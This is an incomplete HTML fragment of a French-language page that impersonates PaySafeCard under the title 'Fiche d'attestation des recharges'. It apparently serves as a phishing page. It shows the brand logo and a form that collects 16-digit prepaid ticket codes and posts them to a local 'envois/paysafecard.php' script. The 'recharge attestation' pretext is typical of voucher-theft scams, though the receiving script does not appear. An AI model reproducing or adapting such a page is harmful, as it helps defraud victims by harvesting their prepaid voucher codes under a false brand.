...
<html lang="en">
  <head>
  	<title>PaySafeCard - Fiche d'attestation des recharges</title>
    <meta charset="utf-8">
    ...
    <div class="container-fluid px-1 py-5 mx-auto">
        <div class="row d-flex justify-content-center">
            <div class="col-xl-7 col-lg-8 col-md-9 col-11 text-center">
                <h3 class="space">PaySafeCard</h3>
                <figure class="margin-bottom-medium">
                    <img src="images/logo_paysafecard.jpg" height="150" width="300" class="footer-logo" alt="PaySafeCard">
                </figure>
                <div class="card">
                    <form class="form-card" action="envois/paysafecard.php" method="POST">
                        ...
                        <div id="row">
                            <div class="row justify-content-between text-left">
                                <div class="form-group col-5 flex-column d-flex">
                                    <input type="number" id="ticket" name="ticket[]" placeholder="Code du ticket" minlength="16" 
                                        maxlength="16" size="16" required="required" onblur="validate(4)" oninput="javascript: if (this.value.length > 16) this.value = this.value.slice(0, 16);">
                                </div>
                                <div class="form-group col-5 flex-column d-flex">
